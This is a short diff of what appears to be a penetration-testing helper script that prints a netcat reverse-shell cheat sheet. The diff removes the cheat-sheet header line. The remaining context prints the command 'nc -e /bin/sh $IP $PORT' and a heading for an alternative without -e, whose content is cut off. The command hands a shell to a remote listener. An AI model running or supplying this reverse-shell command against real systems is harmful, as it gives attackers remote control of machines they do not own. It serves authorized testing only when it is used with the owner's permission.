@@ -1,4 +1,3 @@
-echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [netcat]\033[m"
 echo -e "\033[31m\033[1mAlternative with -e working:\033[m"
 echo -e "\t\033[1mnc -e /bin/sh $IP $PORT\033[m"
 echo -e "\033[31m\033[1mAlternative withput -e:\033[m"
